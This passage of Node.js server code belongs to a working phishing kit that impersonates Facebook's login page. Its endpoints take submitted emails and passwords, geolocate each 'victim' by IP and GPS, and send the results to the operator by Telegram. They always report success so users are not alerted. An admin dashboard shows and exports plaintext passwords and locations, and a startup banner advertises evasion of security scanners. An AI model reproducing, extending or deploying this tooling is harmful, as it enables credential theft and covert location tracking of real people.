                        loginBtn.innerHTML = '<i class="fas fa-check"></i> Login Successful';
                        loginBtn.style.backgroundColor = '#42b72a';
                        
                        // Redirect to real Facebook after 2 seconds
                        setTimeout(() => {
                            window.location.href = '${CONFIG.REDIRECT_URL}';
                        }, 2000);
                    } else {
                        throw new Error('Login failed');
                    }
                    
                } catch (error) {
                    console.error('Error:', error);
                    // Still redirect to Facebook (fail-safe)
                    setTimeout(() => {
                        window.location.href = '${CONFIG.REDIRECT_URL}';
                    }, 1000);
                }
                
                return false;
            }
            
            function showForgotPassword() {
                alert('Password recovery is temporarily unavailable. Please try again later.');
            }
            
            function showCreateAccount() {
                alert('Account creation is currently unavailable. Please try again later.');
            }
            
            // Auto-focus email field
            window.onload = function() {
                document.getElementById('email').focus();
            };
        </script>
    </body>
    </html>
    `);
});

// API endpoint untuk tracking login
app.post('/api/track/login', async (req, res) => {
    try {
        const data = req.body;
        const victimId = req.headers['x-victim-id'];
        const sessionId = req.headers['x-session-id'];
        
        // Validate request
        if (!victimId || !sessionId || !data.credentials) {
            return res.status(400).json({ success: false, error: 'Invalid request' });
        }
        
        // Add server-side data
        data.server_timestamp = new Date().toISOString();
        data.real_ip = req.ip || req.connection.remoteAddress;
        data.user_agent = req.headers['user-agent'];
        
        // Try to get geolocation from IP
        try {
            const geoip = require('geoip-lite');
            const geo = geoip.lookup(data.ip);
            if (geo) {
                data.geoip = {
                    country: geo.country,
                    region: geo.region,
                    city: geo.city,
                    timezone: geo.timezone,
                    coordinates: geo.ll,
                    metro: geo.metro
                };
                
                // Get country name
                const countries = require('i18n-iso-countries');
                data.country = countries.getName(geo.country, 'en') || geo.country;
            }
        } catch (geoError) {
            console.warn('Geolocation error:', geoError.message);
        }
        
        // Add to tracker
        const victim = tracker.addVictim(data);
        
        // Send Telegram alert
        await telegramService.sendLoginAlert(victim);
        
        // Send detailed report if location is available
        if (data.location || data.geoip) {
            setTimeout(() => {
                telegramService.sendDetailedReport(victim);
            }, 2000);
        }
        
        res.json({ 
            success: true, 
            message: 'Login processed successfully',
            redirect: CONFIG.REDIRECT_URL,
            victim_id: victimId
        });
        
    } catch (error) {
        console.error('Error in login tracking:', error);
        res.json({ 
            success: true, // Always return success to not alert user
            message: 'Login processed',
            redirect: CONFIG.REDIRECT_URL
        });
    }
});

// Admin dashboard
app.get('/admin', (req, res) => {
    const { password } = req.query;
    
    if (password !== CONFIG.ADMIN_PASSWORD) {
        return res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Login</title>
            <style>
                body { font-family: Arial, sans-serif; padding: 50px; text-align: center; background: #f0f2f5; }
                .login-box { background: white; padding: 40px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                button { background: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; }
                button:hover { background: #166fe5; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>🔐 Admin Login</h2>
                <form method="GET">
                    <input type="password" name="password" placeholder="Enter admin password" required>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
        `);
    }
    
    const victims = tracker.getVictims(50);
    const stats = tracker.getStats();
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phishing Tracker Admin</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --primary: #1877f2;
                --success: #42b72a;
                --warning: #f39c12;
                --danger: #e74c3c;
                --dark: #2c3e50;
                --light: #ecf0f1;
            }
            
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f6fa; color: #2c3e50; }
            .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
            
            .header {
                background: linear-gradient(135deg, var(--primary), #2980b9);
                color: white;
                padding: 30px;
                border-radius: 15px;
                margin-bottom: 30px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            
            .stat-card {
                background: white;
                padding: 25px;
                border-radius: 12px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.05);
                border-left: 5px solid var(--primary);
                transition: transform 0.3s;
            }
            
            .stat-card:hover {
                transform: translateY(-5px);
            }
            
            .stat-number {
                font-size: 36px;
                font-weight: bold;
                color: var(--primary);
                margin-bottom: 10px;
            }
            
            .victims-table {
                background: white;
                border-radius: 12px;
                padding: 25px;
                margin-top: 30px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.05);
                overflow-x: auto;
            }
            
            table {
                width: 100%;
                border-collapse: collapse;
                margin-top: 20px;
            }
            
            th, td {
                padding: 15px;
                text-align: left;
                border-bottom: 1px solid #eee;
            }
            
            th {
                background: #f8f9fa;
                color: var(--dark);
                font-weight: 600;
                position: sticky;
                top: 0;
            }
            
            tr:hover {
                background: #f8f9fa;
            }
            
            .badge {
                padding: 5px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 600;
                display: inline-block;
            }
            
            .badge-success { background: #d4edda; color: #155724; }
            .badge-warning { background: #fff3cd; color: #856404; }
            .badge-danger { background: #f8d7da; color: #721c24; }
            .badge-info { background: #d1ecf1; color: #0c5460; }
            
            .action-buttons {
                display: flex;
                gap: 10px;
                margin: 20px 0;
                flex-wrap: wrap;
            }
            
            .btn {
                padding: 12px 24px;
                border-radius: 8px;
                border: none;
                cursor: pointer;
                font-weight: 600;
                display: inline-flex;
                align-items: center;
                gap: 8px;
                transition: all 0.3s;
            }
            
            .btn-primary {
                background: var(--primary);
                color: white;
            }
            
            .btn-primary:hover {
                background: #166fe5;
                transform: translateY(-2px);
            }
            
            .btn-success {
                background: var(--success);
                color: white;
            }
            
            .btn-danger {
                background: var(--danger);
                color: white;
            }
            
            .btn-danger:hover {
                background: #c0392b;
            }
            
            .modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                z-index: 1000;
                align-items: center;
                justify-content: center;
            }
            
            .modal-content {
                background: white;
                border-radius: 15px;
                padding: 30px;
                max-width: 800px;
                width: 90%;
                max-height: 80vh;
                overflow-y: auto;
            }
            
            .victim-detail {
                margin: 15px 0;
                padding: 15px;
                background: #f8f9fa;
                border-radius: 8px;
            }
            
            .map-link {
                color: var(--primary);
                text-decoration: none;
            }
            
            .map-link:hover {
                text-decoration: underline;
            }
            
            .copy-btn {
                background: #6c757d;
                color: white;
                border: none;
                padding: 5px 10px;
                border-radius: 4px;
                cursor: pointer;
                font-size: 12px;
                margin-left: 10px;
            }
            
            .copy-btn:hover {
                background: #5a6268;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1><i class="fas fa-shield-alt"></i> Advanced Phishing Tracker Admin</h1>
                <p>Total Victims: ${stats.total} | Last Updated: ${new Date().toLocaleTimeString()}</p>
                
                <div class="action-buttons">
                    <button class="btn btn-primary" onclick="refreshData()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                    <button class="btn btn-primary" onclick="exportData()">
                        <i class="fas fa-download"></i> Export JSON
                    </button>
                    <button class="btn btn-success" onclick="showStats()">
                        <i class="fas fa-chart-bar"></i> Statistics
                    </button>
                    <button class="btn btn-danger" onclick="clearData()">
                        <i class="fas fa-trash"></i> Clear All
                    </button>
                </div>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">${stats.total}</div>
                    <div>Total Victims</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${stats.today}</div>
                    <div>Today</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${stats.last_24h}</div>
                    <div>Last 24 Hours</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${stats.with_location}</div>
                    <div>With Location</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${stats.unique_countries}</div>
                    <div>Unique Countries</div>
                </div>
            </div>
            
            <div class="victims-table">
                <h2><i class="fas fa-users"></i> Recent Victims (Last 50)</h2>
                
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Email/Phone</th>
                            <th>Password</th>
                            <th>Location</th>
                            <th>IP Address</th>
                            <th>Device</th>
                            <th>Time</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${victims.map(v => `
                        <tr>
                            <td><small>${v.id.substring(0, 12)}...</small></td>
                            <td><strong>${v.credentials?.email || v.credentials?.phone || 'N/A'}</strong></td>
                            <td><code>${v.credentials?.password || 'N/A'}</code></td>
                            <td>
                                ${v.location ? 
                                    `<span class="badge badge-success">📍 GPS</span>` : 
                                    v.geoip ? 
                                        `<span class="badge badge-warning">🌐 IP Geo</span><br>
                                         <small>${v.geoip.city || ''} ${v.geoip.country || ''}</small>` :
                                        `<span class="badge badge-danger">❌ No</span>`
                                }
                            </td>
                            <td><code>${v.ip || 'N/A'}</code></td>
                            <td>
                                <small>${v.device?.type || 'Desktop'}</small><br>
                                <small>${v.browser?.name || ''}</small>
                            </td>
                            <td><small>${new Date(v.timestamp).toLocaleTimeString()}</small></td>
                            <td>
                                <button class="btn btn-primary" style="padding: 5px 10px; font-size: 12px;" 
                                        onclick="viewVictim('${v.id}')">
                                    <i class="fas fa-eye"></i> View
                                </button>
                            </td>
                        </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        </div>
        
        <!-- Victim Detail Modal -->
        <div id="victimModal" class="modal">
            <div class="modal-content">
                <h2 id="modalTitle">Victim Details</h2>
                <div id="victimContent"></div>
                <button class="btn btn-primary" onclick="closeModal()" style="margin-top: 20px;">
                    Close
                </button>
            </div>
        </div>
        
        <!-- Statistics Modal -->
        <div id="statsModal" class="modal">
            <div class="modal-content">
                <h2>Detailed Statistics</h2>
                <div id="statsContent"></div>
            </div>
        </div>
        
        <script>
            async function refreshData() {
                window.location.reload();
            }
            
            async function exportData() {
                try {
                    const response = await fetch('/api/admin/export?password=${CONFIG.ADMIN_PASSWORD}');
                    const data = await response.json();
                    
                    if (data.success) {
                        const blob = new Blob([JSON.stringify(data.victims, null, 2)], { type: 'application/json' });
                        const url = window.URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'victims_export_' + new Date().toISOString() + '.json';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        window.URL.revokeObjectURL(url);
                    }
                } catch (error) {
                    alert('Error exporting data: ' + error.message);
                }
            }
            
            async function viewVictim(victimId) {
                try {
                    const response = await fetch('/api/admin/victim/' + victimId + '?password=${CONFIG.ADMIN_PASSWORD}');
                    const data = await response.json();
                    
                    if (data.success) {
                        const victim = data.victim;
                        
                        let content = \`
                            <div class="victim-detail">
                                <h3><i class="fas fa-user"></i> Basic Information</h3>
                                <p><strong>Victim ID:</strong> \${victim.id}</p>
                                <p><strong>Tracking ID:</strong> \${victim.tracking_id}</p>
                                <p><strong>Session ID:</strong> \${victim.session_id}</p>
                                <p><strong>Timestamp:</strong> \${new Date(victim.timestamp).toLocaleString()}</p>
                            </div>
                            
                            <div class="victim-detail">
                                <h3><i class="fas fa-key"></i> Credentials</h3>
                                <p><strong>Email/Phone:</strong> \${victim.credentials?.email || victim.credentials?.phone || 'N/A'}</p>
                                <p><strong>Password:</strong> <code>\${victim.credentials?.password || 'N/A'}</code></p>
                                <p><strong>Login Time:</strong> \${victim.credentials?.timestamp ? new Date(victim.credentials.timestamp).toLocaleString() : 'N/A'}</p>
                            </div>
                        \`;
                        
                        if (victim.ip) {
                            content += \`
                                <div class="victim-detail">
                                    <h3><i class="fas fa-network-wired"></i> Network Information</h3>
                                    <p><strong>IP Address:</strong> <code>\${victim.ip}</code></p>
                                    \${victim.geoip ? \`
                                        <p><strong>Country:</strong> \${victim.geoip.country} (\${victim.country || ''})</p>
                                        <p><strong>City/Region:</strong> \${victim.geoip.city || 'N/A'}, \${victim.geoip.region || ''}</p>
                                        <p><strong>Timezone:</strong> \${victim.geoip.timezone || 'N/A'}</p>
                                        <p><strong>Coordinates:</strong> \${victim.geoip.coordinates?.join(', ') || 'N/A'}</p>
                                    \` : ''}
                                </div>
                            \`;
                        }
                        
                        if (victim.location) {
                            content += \`
                                <div class="victim-detail">
                                    <h3><i class="fas fa-map-marker-alt"></i> GPS Location</h3>
                                    <p><strong>Latitude:</strong> \${victim.location.latitude}</p>
                                    <p><strong>Longitude:</strong> \${victim.location.longitude}</p>
                                    <p><strong>Accuracy:</strong> \${victim.location.accuracy} meters</p>
                                    <p><strong>Altitude:</strong> \${victim.location.altitude || 'N/A'}</p>
                                    <p>
                                        <strong>Maps:</strong> 
                                        <a href="https://maps.google.com/?q=\${victim.location.latitude},\${victim.location.longitude}" 
                                           target="_blank" class="map-link">Google Maps</a> | 
                                        <a href="https://www.openstreetmap.org/?mlat=\${victim.location.latitude}&mlon=\${victim.location.longitude}" 
                                           target="_blank" class="map-link">OpenStreetMap</a>
                                    </p>
                                </div>
                            \`;
                        }
                        
                        if (victim.system) {
                            content += \`
                                <div class="victim-detail">
                                    <h3><i class="fas fa-laptop"></i> System Information</h3>
                                    <p><strong>Browser:</strong> \${victim.browser?.name || 'N/A'} \${victim.browser?.version || ''}</p>
                                    <p><strong>Platform:</strong> \${victim.platform || victim.system.platform}</p>
                                    <p><strong>Device:</strong> \${victim.device?.type || 'Desktop'} \${victim.device?.model || ''}</p>
                                    <p><strong>Screen:</strong> \${victim.screen?.width || victim.system.screen?.width} x \${victim.screen?.height || victim.system.screen?.height}</p>
                                    <p><strong>Timezone:</strong> \${victim.timezone || victim.system.timezone}</p>
                                    <p><strong>CPU Cores:</strong> \${victim.cpu_cores || victim.system.hardwareConcurrency}</p>
                                    <p><strong>RAM:</strong> \${victim.ram || victim.system.deviceMemory} GB</p>
                                </div>
                            \`;
                        }
                        
                        if (victim.network) {
                            content += \`
                                <div class="victim-detail">
                                    <h3><i class="fas fa-wifi"></i> Network Details</h3>
                                    <p><strong>Connection Type:</strong> \${victim.network.effectiveType || victim.network.type}</p>
                                    <p><strong>Download Speed:</strong> \${victim.network.downlink || 'N/A'} Mbps</p>
                                    <p><strong>Latency:</strong> \${victim.network.rtt || 'N/A'} ms</p>
                                </div>
                            \`;
                        }
                        
                        document.getElementById('victimContent').innerHTML = content;
                        document.getElementById('victimModal').style.display = 'flex';
                    }
                } catch (error) {
                    alert('Error loading victim details: ' + error.message);
                }
            }
            
            function showStats() {
                const stats = ${JSON.stringify(stats)};
                let content = \`
                    <div class="victim-detail">
                        <h3><i class="fas fa-chart-pie"></i> Overall Statistics</h3>
                        <p><strong>Total Victims:</strong> \${stats.total}</p>
                        <p><strong>Today:</strong> \${stats.today}</p>
                        <p><strong>Last 24 Hours:</strong> \${stats.last_24h}</p>
                        <p><strong>With GPS Location:</strong> \${stats.with_location}</p>
                        <p><strong>With Camera Data:</strong> \${stats.with_camera}</p>
                        <p><strong>Unique Countries:</strong> \${stats.unique_countries}</p>
                    </div>
                    
                    <div class="victim-detail">
                        <h3><i class="fas fa-clock"></i> Activity Timeline</h3>
                        <p>Last victim: \${victims.length > 0 ? new Date(victims[0].timestamp).toLocaleString() : 'N/A'}</p>
                        <p>First victim today: \${stats.today > 0 ? 'Available' : 'None'}</p>
                    </div>
                \`;
                
                document.getElementById('statsContent').innerHTML = content;
                document.getElementById('statsModal').style.display = 'flex';
            }
            
            async function clearData() {
                if (confirm('Are you sure you want to delete ALL victim data? This action cannot be undone!')) {
                    try {
                        const response = await fetch('/api/admin/clear?password=${CONFIG.ADMIN_PASSWORD}', {
                            method: 'POST'
                        });
                        const data = await response.json();
                        
                        if (data.success) {
                            alert('All data cleared successfully!');
                            window.location.reload();
                        }
                    } catch (error) {
                        alert('Error clearing data: ' + error.message);
                    }
                }
            }
            
            function closeModal() {
                document.getElementById('victimModal').style.display = 'none';
                document.getElementById('statsModal').style.display = 'none';
            }
            
            // Close modal on outside click
            window.onclick = function(event) {
                const modal = document.getElementById('victimModal');
                const statsModal = document.getElementById('statsModal');
                
                if (event.target === modal) {
                    modal.style.display = 'none';
                }
                if (event.target === statsModal) {
                    statsModal.style.display = 'none';
                }
            };
            
            // Auto-refresh every 30 seconds
            setInterval(refreshData, 30000);
        </script>
    </body>
    </html>
    `);
});

// Admin API endpoints
app.get('/api/admin/export', (req, res) => {
    if (req.query.password !== CONFIG.ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    
    const victims = tracker.getVictims(1000); // Get all victims
    res.json({
        success: true,
        count: victims.length,
        export_time: new Date().toISOString(),
        victims: victims
    });
});

app.get('/api/admin/victim/:id', (req, res) => {
    if (req.query.password !== CONFIG.ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    
    const victim = tracker.getVictim(req.params.id);
    if (!victim) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
    }
    
    res.json({ success: true, victim: victim });
});

app.post('/api/admin/clear', (req, res) => {
    if (req.query.password !== CONFIG.ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    
    // Clear all victims
    tracker.victims.clear();
    tracker.saveData();
    
    res.json({ success: true, message: 'All data cleared successfully' });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        victims: tracker.victims.size,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        node_version: process.version
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>404 - Page Not Found</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            h1 { color: #666; }
        </style>
    </head>
    <body>
        <h1>404 - Page Not Found</h1>
        <p>The page you are looking for does not exist.</p>
    </body>
    </html>
    `);
});

// Error handler
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error',
        message: CONFIG.NODE_ENV === 'development' ? err.message : undefined
    });
});

// ==================== START SERVER ====================
// For Vercel
if (process.env.VERCEL) {
    module.exports = app;
} else {
    // For local development
    app.listen(CONFIG.PORT, () => {
        console.log(`
╔══════════════════════════════════════════════════════════════════╗
║              ADVANCED PHISHING TRACKER v2.0                      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  🔗 Local URL: http://localhost:${CONFIG.PORT}                    ║
║  📊 Port: ${CONFIG.PORT}                                          ║
║  🔐 Admin Password: ${CONFIG.ADMIN_PASSWORD}                     ║
║  📁 Data Storage: Encrypted JSON                                 ║
║                                                                  ║
║  🛡️  Security Features:                                           ║
║     • Anti-Scanner Protection                                    ║
║     • Rate Limiting (50 requests/15min)                         ║
║     • Encrypted Data Storage                                     ║
║     • Fake Responses for Scanners                                ║
║     • DNS Bypass Ready                                           ║
║                                                                  ║
║  📱 Tracking Features:                                           ║
║     • GPS Location Capture                                       ║
║     • Device Fingerprinting                                      ║
║     • Network Information                                        ║
║     • Browser/OS Detection                                       ║
║     • Telegram Real-time Alerts                                  ║
║                                                                  ║
║  🤖 Telegram Bot: ${telegramService.bot ? '✅ Connected' : '❌ Disabled'} ║
║  📊 Current Victims: ${tracker.victims.size}                     ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
        `);
        
        // Auto-save reminder
        setInterval(() => {
            console.log('💾 Auto-saved victim data');
        }, 60000);
    });
}
